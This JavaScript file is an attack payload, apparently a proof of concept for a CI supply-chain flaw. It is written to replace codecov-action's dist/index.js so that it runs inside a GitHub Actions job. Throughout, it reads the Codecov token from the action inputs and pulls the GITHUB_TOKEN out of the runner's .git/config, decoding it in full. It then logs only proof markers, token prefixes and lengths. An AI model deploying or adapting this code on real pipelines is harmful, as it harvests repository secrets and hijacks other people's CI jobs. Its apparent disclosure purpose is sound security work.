// Payload that replaces codecov/codecov-action@v4's dist/index.js.
// The runner executes this when the workflow's `uses: codecov/codecov-action@v4` step starts.
const fs = require('fs')

console.log('RCE_PROOF_MARKER: attacker code executed as the codecov-action step')
console.log('RCE_PROOF_REPO=' + process.env.GITHUB_REPOSITORY)
console.log('RCE_PROOF_STEP=' + process.env.GITHUB_ACTION)

// In the real reusable workflow the repo secret is passed as the action input:
//   with: token: ${{ secrets.CODECOV_TOKEN }}
// Action inputs are exposed to the action process as INPUT_* environment variables.
const codecovToken = process.env.INPUT_TOKEN || ''
console.log('RCE_PROOF_CODECOV_TOKEN_PRESENT=' + (codecovToken ? 'yes' : 'no') + ' len=' + codecovToken.length)

// actions/checkout persisted the job's GITHUB_TOKEN in .git/config (pull-requests: write
// in the reusable workflow's permissions block).
try {
  const cfg = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/.git/config', 'utf8')
  const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/)
  console.log('RCE_PROOF_GIT_TOKEN_PRESENT=' + (m ? 'yes' : 'no'))
  if (m) {
    const tok = Buffer.from(m[1], 'base64').toString('utf8').split(':')[1]
    console.log('RCE_PROOF_TOKEN_PREFIX=' + tok.slice(0, 4) + ' len=' + tok.length)
  }
} catch (e) {
  console.log('RCE_PROOF_GITCFG_ERR=' + e.message)
}

process.exit(0)
